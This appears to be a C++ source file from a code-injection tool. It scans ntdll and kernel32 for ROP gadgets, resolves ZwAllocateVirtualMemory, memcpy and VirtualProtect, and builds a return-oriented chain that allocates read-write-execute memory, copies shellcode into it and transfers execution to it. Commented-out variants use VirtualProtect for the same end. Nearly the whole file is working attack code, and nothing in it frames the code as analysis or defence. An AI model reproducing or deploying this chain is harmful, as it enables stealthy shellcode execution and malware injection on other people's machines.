#include "ROPHelper.h"

#include <iostream>
using namespace std;

ULONGLONG FindPopGadgets(BYTE* Ntdll, BYTE* PopGadgets, size_t PopGadgetsLen)
{

	ULONGLONG i = 0;
	size_t j = 0;

	for (i = 0; i < 0x100000; ++i)
	{
		for (j = 0; j < PopGadgetsLen; ++j)
		{
			if (PopGadgets[j] != Ntdll[i + j])
				break;
		}
		if (j == PopGadgetsLen)
			return (ULONGLONG)&Ntdll[i];
	}

	return 0;
}


ULONGLONG NtYieldExecution{ 0 };
ULONGLONG PopGadgetsAddress{ 0 };
ULONGLONG PushRaxAddress{ 0 };

ULONGLONG MessageBoxAddress{ 0 };
ULONGLONG CreateMutexAddress{ 0 };
ULONGLONG RtlExitUserThreadAddress{ 0 };
ULONGLONG VirtualProtectAddress{ 0 };

ULONGLONG ZwAllocateVirtualMemoryAddress{ 0 };
ULONGLONG MemcpyAddress{ 0 };

VOID FindFunctionAddresses() {
	BYTE PopGadgets[] = {
		0x58,
		0x5a,			// pop rdx
		0x59,			// pop rcx
		0x41, 0x58,		// pop r8
		0x41, 0x59,		// pop r9
		0x41, 0x5a,		// pop r10
		0x41, 0x5b,		// pop r11
		0xc3			// ret
	};

	BYTE PushRax[] = {
		0x50,  // push rax
		0xc3  // ret
	};

	HMODULE hUser32 = LoadLibraryA("user32.dll");
	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
	HMODULE hKernelBase = GetModuleHandleA("kernelbase.dll");
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

	MessageBoxAddress = (ULONGLONG)GetProcAddress(hUser32, "MessageBoxA");
	CreateMutexAddress = (ULONGLONG)GetProcAddress(hKernel32, "CreateMutexA");
	RtlExitUserThreadAddress = (ULONGLONG)GetProcAddress(hNtdll, "RtlExitUserThread");
	VirtualProtectAddress = (ULONGLONG)GetProcAddress(hKernelBase, "VirtualProtect");
	RtlExitUserThreadAddress = (ULONGLONG)GetProcAddress(hNtdll, "RtlExitUserThread");

	ZwAllocateVirtualMemoryAddress = (ULONGLONG)GetProcAddress(hNtdll, "ZwAllocateVirtualMemory");
	MemcpyAddress = (ULONGLONG)GetProcAddress(hNtdll, "memcpy");

	PopGadgetsAddress = FindPopGadgets((PBYTE)hNtdll, PopGadgets, sizeof(PopGadgets));

	PushRaxAddress = FindPopGadgets((PBYTE)hKernel32, PushRax, sizeof(PushRax));

	if (PushRaxAddress == 0)
		cout << "error" << endl;

	if (MessageBoxAddress == 0 ||
		RtlExitUserThreadAddress == 0 ||
		ZwAllocateVirtualMemoryAddress == 0)
		cout << "no function" << endl;

	if (PopGadgetsAddress == 0)
		cout << "2 zero" << endl;
}

VOID BuildSimpleRop(ROPBuffer* Rop, ULONGLONG ShellcodeSize, ULONGLONG RemoteShellcodeAddress) {
	/*NTSTATUS ZwAllocateVirtualMemory(
		_In_    HANDLE    ProcessHandle,
		_Inout_ PVOID * BaseAddress,
		_In_    ULONG_PTR ZeroBits,
		_Inout_ PSIZE_T   RegionSize,
		_In_    ULONG     AllocationType,
		_In_    ULONG     Protect
	);*/

	//Rop->SetRip(PopGadgetsAddress + 0x1);

	//Rop->InsertRopValue(Rop->GetRsp() + 0x78);  // rdx = BaseAddress
	//Rop->InsertRopValue((ULONGLONG)GetCurrentProcess());  // rcx = ProcessHandle
	//Rop->InsertRopValue(NULL);  // r8 = ZeroBits
	//Rop->InsertRopValue(Rop->GetRsp() + 0x80);  // r9 = RegionSize

	//Rop->InsertRopValue((ULONGLONG)-1);  // r10
	//Rop->InsertRopValue((ULONGLONG)-1);  // r11

	//Rop->InsertRopValue(ZwAllocateVirtualMemoryAddress);

	//// execute stack
	//Rop->InsertRopValue(0);
	//Rop->InsertRopValue(0);
	//Rop->InsertRopValue(0);
	//Rop->InsertRopValue(0);
	//Rop->InsertRopValue(MEM_COMMIT);  // AllocationType
	//Rop->InsertRopValue(PAGE_EXECUTE_READWRITE);  // Protect

	//Rop->InsertRopValue(PopGadgetsAddress + 0x1);

	//Rop->InsertRopValue(RemoteShellcodeAddress);  // rdx = *src
	//Rop->InsertRopValue(NULL);  // rcx = *dest
	//Rop->InsertRopValue(sizeof(ULONGLONG));  // r8 = count
	//Rop->InsertRopValue(0);  // r9
	//Rop->InsertRopValue(0);  // r10
	//Rop->InsertRopValue(0);  // r11

	//Rop->InsertRopValue(MemcpyAddress);

	//Rop->InsertRopValue(0);
	//Rop->InsertRopValue(0);
	//Rop->InsertRopValue(0);

	//Rop->InsertRopValue(PushRaxAddress);



	Rop->SetRip(PopGadgetsAddress + 0x1);

	Rop->InsertRopValue(Rop->GetRsp() + 0x80);  // rdx
	Rop->InsertRopValue((ULONGLONG)GetCurrentProcess());  // rcx
	Rop->InsertRopDataPointer(NULL);  // r8
	//Rop->InsertRopValue(Rop->GetRsp() + 0x88);  // r9
	Rop->InsertRopDataPointer(2);

	Rop->InsertRopValue((ULONGLONG)-1);  // r10
	Rop->InsertRopValue((ULONGLONG)-1);  // r11

	Rop->InsertRopValue(ZwAllocateVirtualMemoryAddress);  // ret

	Rop->InsertRopValue(PopGadgetsAddress + 0x1);  // ret address
	Rop->InsertRopValue((ULONGLONG)-1);  // rdx
	Rop->InsertRopValue((ULONGLONG)-1);  // rcx
	Rop->InsertRopValue((ULONGLONG)-1);  // r8
	Rop->InsertRopValue((ULONGLONG)-1);  // r9
	Rop->InsertRopValue(MEM_COMMIT);  // arg5  // r10
	Rop->InsertRopValue(PAGE_EXECUTE_READWRITE);  // arg6  // r11

	//void* memcpy(
	//	void* dest,
	//	const void* src,
	//	size_t count
	//);

	Rop->InsertRopValue(PopGadgetsAddress + 0x1);  // ret address
	Rop->InsertRopValue(RemoteShellcodeAddress);  // rdx +70
	Rop->InsertRopValue(NULL);  // rcx
	Rop->InsertRopValue(ShellcodeSize);  // r8 +80
	Rop->InsertRopValue((ULONGLONG)0);  // r9
	Rop->InsertRopValue((ULONGLONG)0);  // r10
	Rop->InsertRopValue((ULONGLONG)0);  // r11


	Rop->InsertRopValue(MemcpyAddress);
	//Rop->InsertRopValue(RemoteShellcodeAddress);
	Rop->InsertRopValue(PushRaxAddress);




	//Rop->InsertRopValue(sizeof(2)); // Rdx = dwSize
	//Rop->InsertRopValue(RemoteShellcode); // Rcx = lpAddress
	//Rop->InsertRopValue(PAGE_EXECUTE_READWRITE); // R8 = flNewProtect
	//Rop->InsertRopDataPointer(0); // R9 = lpflOldProtect

	//Rop->SetRip(PopGadgetsAddress + 1); // +1 to skip pop rax opcode
	//Rop->InsertRopValue(0); // R10 is unused
	//Rop->InsertRopValue(0); // R11 is unused

	//Rop->InsertRopValue(VirtualProtectAddress);
	//// return directly to shellcode
	//Rop->InsertRopValue(RemoteShellcodeAddress);
}